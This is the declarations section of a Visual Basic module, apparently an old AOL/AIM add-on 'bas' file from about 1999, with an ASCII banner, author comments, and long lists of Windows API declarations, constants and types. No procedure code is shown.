Attribute VB_Name = "Ouwop"
'                                Ouwop.Bas
'   ;;;;;;;;        ;;;;;;;;;,               ,;;;;;;;;;       ;;;;;;;;
'   ;;;;;;;;         ´;;;;;;;;,             ,;;;;;;;;´        ;;;;;;;;
'   ;;;;;;;;          ´;;;;;;;;;           ;;;;;;;;;´         ;;;;;;;;
'   ;;;;;;;;            ;;;;;;;;;,       ,;;;;;;;;;           ;;;;;;;;
'   ;;;;;;;;             ´;;;;;;;;,     ,;;;;;;;;´            ;;;;;;;;
'   ;;;;;;;;              ´;;;;;;;;;   ;;;;;;;;;´             ;;;;;;;;
'   ;;;;;;;;                ;;;;;;;;;,;;;;;;;;;               ;;;;;;;;
'   ;;;;;;;;                 ´;;;;;;;;;;;;;;;´                ;;;;;;;;
'   ;;;;;;;;                  ´;;;;;;;;;;;;;´                 ;;;;;;;;
'   ;;;;;;;;                    ;;;;;;;;;;;                   ;;;;;;;;
'   ;;;;;;;;                    ,;;;;;;;;;,                   ;;;;;;;;
'   ;;;;;;;;                   ,;;;;;;;;;;;,                  ;;;;;;;;
'   ;;;;;;;;                  ;;;;;;;;;;;;;;;                 ;;;;;;;;
'   ;;;;;;;;                ,;;;;;;;;;;;;;;;;;,               ;;;;;;;;
'   ;;;;;;;;               ,;;;;;;;;´ ´;;;;;;;;,              ;;;;;;;;
'   ;;;;;;;;              ;;;;;;;;;´   ´;;;;;;;;;             ;;;;;;;;
'   ;;;;;;;;            ,;;;;;;;;;       ;;;;;;;;;,           ;;;;;;;;
'   ;;;;;;;;           ,;;;;;;;;´         ´;;;;;;;;,          ;;;;;;;;
'   ;;;;;;;;          ;;;;;;;;;´           ´;;;;;;;;;         ;;;;;;;;
'   ;;;;;;;;        ,;;;;;;;;;               ;;;;;;;;;,       ;;;;;;;;
'   ;;;;;;;;       ,;;;;;;;;´                 ´;;;;;;;;,      ;;;;;;;;
'   ;;;;;;;;      ;;;;;;;;;´                   ´;;;;;;;;;     ;;;;;;;;
'     VB32Bit VB4- Interactive with [AIM2/3-AOL2/3/4/5-Win95/98]
'                            Ouwop33@Hotmail.com
    'All Subz or Functionz in diz Module dat Wuznt Created By Me are
    'Credited to The Programmer Even if i Edited them for better use.
                                '[ouwop]'
'_____________________________________________________________________

'IXI iz my groupz tag weve been in since January 1999, 1 year avinverzary
'http://ouwop.cjb.net
'again, YEZ i know some uv theze procedurez in here are from uva programmerz
'i gave credit to thoze who wrote the codez and if i edited em to make em better
'i did so, thiz bas should be everything you need in makin a full progg, if u need
'help feel free to email me -=P
'''''''
'Da Declarez
Dim buttun, caption As String
Public Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function TextOut Lib "gdi32" Alias "TextOutA" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long, ByVal lpString As String, ByVal nCount As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Declare Function Shell_NotifyIcon Lib "shell32.dll" Alias _
"Shell_NotifyIconA" (ByVal dwMessage As Long, lpData As _
NOTIFYICONDATA) As Long
Public Type NOTIFYICONDATA
cbSize As Long
hwnd As Long
uId As Long
    uFlags As Long
    ucallbackMessage As Long
    hIcon As Long
    szTip As String * 64
    End Type
    Public Const NIM_ADD = &H0
Public Const NIM_MODIFY = &H1
Public Const NIM_DELETE = &H2
Public Const NIF_MESSAGE = &H1
Public Const NIF_ICON = &H2
Public Const NIF_TIP = &H4
Public Const WM_MOUSEMOVE = &H200
Public Const WM_LBUTTONDBLCLK = &H203
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_RBUTTONDOWN = &H204
Public Const NIF_DOALL = NIF_MESSAGE Or NIF_ICON Or NIF_TIP
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Declare Function lstrcpy Lib "Kernel" (ByVal lpString1 As Any, ByVal lpString2 As Any) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lparam As Any) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function getnextwindow Lib "user32" Alias "GetNextWindow" (ByVal hwnd As Long, ByVal wFlag As Long) As Long
Declare Function fCreateShellLink Lib "STKIT432.DLL" _
(ByVal lpstrFolderName As String, ByVal lpstrLinkName As String, _
ByVal lpstrLinkPath As String, ByVal lpstrLinkArguments As String) As Long
Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Boolean
   Const WM_NCCREATE = &H81
    Const WM_NCDESTROY = &H82
    Const WM_NCCALCSIZE = &H83
    Const WM_NCHITTEST = &H84
    Const WM_NCPAINT = &H85
    Const WM_NCACTIVATE = &H86
    Const WM_GETDLGCODE = &H87
    Const WM_NCLBUTTONDBLCLK = &HA3
    Const WM_NCRBUTTONDOWN = &HA4
    Const WM_NCRBUTTONUP = &HA5
    Const WM_NCRBUTTONDBLCLK = &HA6
    Const WM_NCMBUTTONDOWN = &HA7
    Const WM_NCMBUTTONUP = &HA8
    Const WM_NCMBUTTONDBLCLK = &HA9
    Const WM_KEYFIRST = &H100
    Const WM_DEADCHAR = &H103
    Const WM_SYSKEYDOWN = &H104
    Const WM_SYSKEYUP = &H105
    Const WM_SYSCHAR = &H106
    Const WM_SYSDEADCHAR = &H107
    Const WM_KEYLAST = &H108
    Const WM_INITDIALOG = &H110
    Const WM_TIMER = &H113
    Const WM_HSCROLL = &H114
    Const WM_VSCROLL = &H115
    Const WM_INITMENU = &H116
    Const WM_INITMENUPOPUP = &H117
    Const WM_MENUSELECT = &H11F
    Const WM_MENUCHAR = &H120
    Const WM_ENTERIDLE = &H121
    Const WM_CTLCOLORMSGBOX = &H132
    Const WM_CTLCOLOREDIT = &H133
    Const WM_CTLCOLORLISTBOX = &H134
    Const WM_CTLCOLORBTN = &H135
    Const WM_CTLCOLORDLG = &H136
    Const WM_CTLCOLORSCROLLBAR = &H137
    Const WM_CTLCOLORSTATIC = &H138
    Const WM_MOUSEFIRST = &H200
    Const WM_RBUTTONUP = &H205
    Const WM_RBUTTONDBLCLK = &H206
    Const WM_MBUTTONDOWN = &H207
    Const WM_MBUTTONUP = &H208
    Const WM_MBUTTONDBLCLK = &H209
    Const WM_MOUSELAST = &H209
    Const WM_PARENTNOTIFY = &H210
    Const WM_ENTERMENULOOP = &H211
    Const WM_EXITMENULOOP = &H212
    Const WM_DROPFILES = &H233
    Const WM_MDIREFRESHMENU = &H234
    Const WM_UNDO = &H304
    Const WM_RENDERFORMAT = &H305
    Const WM_RENDERALLFORMATS = &H306
    Const WM_DESTROYCLIPBOARD = &H307
    Const WM_DRAWCLIPBOARD = &H308
    Const WM_PAINTCLIPBOARD = &H309
    Const WM_VSCROLLCLIPBOARD = &H30A
    Const WM_SIZECLIPBOARD = &H30B
    Const WM_ASKCBFORMATNAME = &H30C
    Const WM_CHANGECBCHAIN = &H30D
    Const WM_HSCROLLCLIPBOARD = &H30E
    Const WM_QUERYNEWPALETTE = &H30F
    Const WM_PALETTEISCHANGING = &H310
    Const WM_PALETTECHANGED = &H311
    Const WM_HOTKEY = &H312
    Const WM_PENWINFIRST = &H380
    Const WM_PENWINLAST = &H38F
    Const WM_NULL = &H0
    Const WM_CREATE = &H1
    Const WM_SIZE = &H5
    Const WM_ACTIVATE = &H6
Public Const EWX_FORCE = 4
Public Const EWX_LOGOFF = 0
Public Const EWX_REBOOT = 2
Public Const ewx_shutdown = 1
Public Const FADE_RED = &HFF&
Public Const FADE_GREEN = &HFF00&
Public Const FADE_BROWN = 996633
Public Const FADE_BLUE = &HFF0000
Public Const FADE_YELLOW = &HFFFF&
Public Const FADE_WHITE = &HFFFFFF
Public Const FADE_BLACK = &H0&
Public Const FADE_PURPLE = &HFF00FF
Public Const FADE_GREY = &HC0C0C0
Public Const FADE_PINK = &HFF80FF
Public Const FADE_TURQUOISE = &HC0C000
Type COLORRGB
  red As Long
  green As Long
  blue As Long
End Type
Private Declare Function SystemParametersInfo Lib "user32" Alias _
    "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam _
    As Long, ByVal lpvParam As String, ByVal fuWinIni As Long) As Long
    Const SPI_SETDESKWALLPAPER = 20
    Const SPIF_UPDATEINIFILE = &H1
    Const SPIF_SENDWININICHANGE = &H2

Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function SelectObject Lib "user32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Declare Sub ReleaseCapture Lib "user32" ()
Declare Function SenditByString& Lib "user32" Alias "SendMessageA" (ByVal hwnd&, ByVal wMsg&, ByVal wParam&, ByVal lparam$)
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Public Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal fEnable As Long) As Long
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lparam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lparam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function IsWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lparam As String) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const Cb_AddString& = &H143
Public Const CB_DELETESTRING& = &H144
Public Const CB_FINDSTRINGEXACT& = &H158
Public Const CB_GETCOUNT& = &H146
Public Const Cb_GetItemData = &H150
Public Const Cb_GetLbText& = &H148
Public Const CB_RESETCONTENT& = &H14B
Public Const CB_SETCURSEL& = &H14E
Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Public Const BM_GETCHECK = &HF0
Public Const BM_SETCHECK = &HF1
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230
Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const BM_GETSTATE = &HF2
Public Const BM_SETSTATE = &HF3
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181
Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9
Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10
Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1
Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&
Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)
Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000
Type RECT
   Left As Long
   top As Long
   Right As Long
   Bottom As Long
End Type
Type POINTAPI
   X As Long
   Y As Long
End Type
Type SYSTEM_INFO
    dwOemID As Long
        dwPageSize As Long
        lpMinimumApplicationAddress As Long
        lpMaximumApplicationAddress As Long
        dwActiveProcessorMask As Long
        dwNumberOrfProcessors As Long
        dwProcessorType As Long
        dwAllocationGranularity As Long
        dwReserved As Long
End Type
Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
        dwMajorVersion As Long
        dwMinorVersion As Long
        dwBuildNumber As Long
        dwPlatformId As Long
        szCSDVersion As String * 128
End Type
Type MEMORYSTATUS
    dwLength As Long
        dwMemoryLoad As Long
        dwTotalPhys As Long
        dwAvailPhys As Long
        dwTotalPageFile As Long
        dwAvailPageFile As Long
        dwTotalVirtual As Long
        dwAvailVirtual As Long
End Type
Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetFileVersionInfo Lib "version.dll" Alias "GetFileVersionInfoA" (ByVal lptstrFilename As String, ByVal dwHandle As Long, ByVal dwLen As Long, lpData As Any) As Long
Declare Function GetVersion Lib "kernel32" () As Long
Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long
Declare Sub GlobalMemoryStatus Lib "kernel32" (lpBuffer As MEMORYSTATUS)
Declare Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
Public Const PROCESSOR_INTEL_386 = 386
Public Const PROCESSOR_INTEL_486 = 486
Public Const PROCESSOR_INTEL_586 = 586
Public Const PROCESSOR_INTEL_Pentium = "Pentium"
'Public Const PROCESSOR_INTEL_786 = 786
'Public Const PROCESSOR_INTEL_886 = 886
Public Const PROCESSOR_MIPS_R4000 = 4000
Public Const PROCESSOR_ALPHA_21064 = 21064
Private Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean
Private Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwflags As Long) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (destination As Any, Source As Any, ByVal Length As Long)
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lparam As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lparam As Long)
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
'spy
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Public Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer
Public Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
'dun spy
Public Const DM_PELSWIDTH = &H80000
Public Const DM_PELSHEIGHT = &H100000
Dim DevM As DEVMODE
Public Const CCDEVICENAME = 32
Public Const CCFORMNAME = 32
Public Const conMCIAppTitle = "MCI Control Application"
Public Const conMCIErrInvalidDeviceID = 30257
Public Const conMCIErrDeviceOpen = 30263
Public Const conMCIErrCannotLoadDriver = 30266
Public Const conMCIErrUnsupportedFunction = 30274
Public Const conMCIErrInvalidFile = 30304
Private Type DEVMODE
    dmDeviceName As String * CCDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer
    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer
    dmFormName As String * CCFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type
Public Const SND_MEMORY = &H4
Private Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, _
lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, _
lpTotalNumberOfClusters As Long) As Long
Type DISKSPACEINFO
    RootPath As String * 3
    freebytes As Long
    totalbytes As Long
    FreePcnt As Single
    UsedPcnt As Single
End Type
Global CurrentDisk As DISKSPACEINFO
Public Const SND_FLAG = SND_ASYNC Or SND_NODEFAULT
Public Const VK_MENU = &H12
Public Const VK_SHIFT = &H10
Public Const VK_UP = &H26
Public Const WM_MOVE = &HF012
Public Const WM_SYSCOMMAND = &H112
Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000
Public Const ENTER_KEY = 13
Public Const EM_GETLINE = &HC4
Public Const RGN_AND = 1
Public Const RGN_COPY = 5
Public Const RGN_DIFF = 4
Public Const RGN_OR = 2
Public Const RGN_XOR = 3
Public Const WM_NCMOUSEMOVE = &HA0
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const WM_NCLBUTTONUP = &HA2
Public Const HTERROR = (-2)
Public Const HTTRANSPARENT = (-1)
Public Const HTNOWHERE = 0
Public Const HTCLIENT = 1
Public Const HTCAPTION = 2
Public Const HTSYSMENU = 3
Public Const HTGROWBOX = 4
Public Const HTSIZE = HTGROWBOX
Public Const HTMENU = 5
Public Const HTHSCROLL = 6
Public Const HTVSCROLL = 7
Public Const HTMINBUTTON = 8
Public Const HTMAXBUTTON = 9
Public Const HTLEFT = 10
Public Const HTRIGHT = 11
Public Const HTTOP = 12
Public Const HTTOPLEFT = 13
Public Const HTTOPRIGHT = 14
Public Const HTBOTTOM = 15
Public Const HTBOTTOMLEFT = 16
Public Const HTBOTTOMRIGHT = 17
Public Const HTBORDER = 18
Public Const HTREDUCE = HTMINBUTTON
Public Const HTZOOM = HTMAXBUTTON
Public Const HTSIZEFIRST = HTLEFT
Public Const HTSIZELAST = HTBOTTOMRIGHT
Public Const Plug = "Hound_Dog"
Public GiveClsNam As Long
Public Const SRCCOPY = &HCC0020
Public Const SRCAND = &H8800C6
Public Const SRCINVERT = &H660046
Public Const blue = "0000FF"
Public Const LBlue = "#33CCFF"
Public Const DBlue = "#000088"
Public Const green = "#00CC00"
Public Const LGreen = "#00FF00"
Public Const DGreen = "#006600"
Public Const red = "#FF0000"
Public Const DRed = "#AA0000"
Public Const Yellow = "#FFFF00"
Public Const Grey = "#BBBBBB"
Public Const LGrey = "#DDDDDD"
Public Const DGrey = "#999999"
Public Const Orange = "FF9900"
Public Const Purple = "CC33CC"
Public Const Pink = "#FF6699"
Private Const REG_SZ = 1
Private Const HKEY_CURRENT_USER = &H80000001
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const REG_OPTION_NON_VOLATILE = 0
Private Const SYNCHRONIZE = &H100000
Private Const STANDARD_RIGHTS_ALL = &H1F0000
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_NOTIFY = &H10
Private Const KEY_CREATE_LINK = &H20
Private Const ERROR_SUCCESS = 0&
Private Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or KEY_QUERY_VALUE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or KEY_CREATE_LINK) And (Not SYNCHRONIZE))
Const CLR_MENUBAR = &H80000004
Const Number_of_Menu_Selections = 3
Const SC_MOVE = &HF012
Const WA_INACTIVE = 0
Const WA_ACTIVE = 1
Const WA_CLICKACTIVE = 2
Const WM_SETFOCUS = &H7
Const WM_KILLFOCUS = &H8
Const WM_ENABLE = &HA
Const WM_SETREDRAW = &HB
Const WM_PAINT = &HF
Const WM_QUERYENDSESSION = &H11
Const WM_QUIT = &H12
Const WM_QUERYOPEN = &H13
Const WM_ERASEBKGND = &H14
Const WM_SYSCOLORCHANGE = &H15
Const WM_ENDSESSION = &H16
Const WM_SHOWWINDOW = &H18
Const WM_WININICHANGE = &H1A
Const WM_DEVMODECHANGE = &H1B
Const WM_ACTIVATEAPP = &H1C
Const WM_FONTCHANGE = &H1D
Const WM_TIMECHANGE = &H1E
Const WM_CANCELMODE = &H1F
Const WM_SETCURSOR = &H20
Const WM_MOUSEACTIVATE = &H21
Const WM_CHILDACTIVATE = &H22
Const WM_QUEUESYNC = &H23
Const WM_GETMINMAXINFO = &H24
Const WM_PAINTICON = &H26
Const WM_ICONERASEBKGND = &H27
Const WM_NEXTDLGCTL = &H28
Const WM_SPOOLERSTATUS = &H2A
Const WM_DRAWITEM = &H2B
Const WM_MEASUREITEM = &H2C
Const WM_DELETEITEM = &H2D
Const WM_VKEYTOITEM = &H2E
Const WM_CHARTOITEM = &H2F
Const WM_SETFONT = &H30
Const WM_GETFONT = &H31
Const WM_SETHOTKEY = &H32
Const WM_GETHOTKEY = &H33
Const WM_QUERYDRAGICON = &H37
Const WM_COMPAREITEM = &H39
Const WM_COMPACTING = &H41
Const CN_RECEIVE = &H1
Const CN_TRANSMIT = &H2
Const CN_EVENT = &H4
Const WM_WINDOWPOSCHANGING = &H46
Const WM_WINDOWPOSCHANGED = &H47
